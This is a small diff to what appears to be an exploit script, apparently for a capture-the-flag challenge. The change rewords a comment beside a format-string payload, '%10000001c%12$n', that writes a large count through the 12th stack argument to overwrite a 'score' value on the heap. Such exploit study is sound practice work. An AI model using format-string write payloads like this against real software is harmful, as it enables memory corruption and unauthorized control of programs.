@@ -10,7 +10,7 @@ def start(argv=[], *a, **kw):
 
 
 magic_num   = b'202009'
-num_rounds  = b'%10000001c%12$n' # overwriting the 'score' pointer on the heap(12th element), 
+num_rounds  = b'%10000001c%12$n' # overwriting the 'score' pointer value on the heap(located at the 12th element on the stack)
                                  # https://www.youtube.com/watch?v=KpXsfimrkFo
 
 
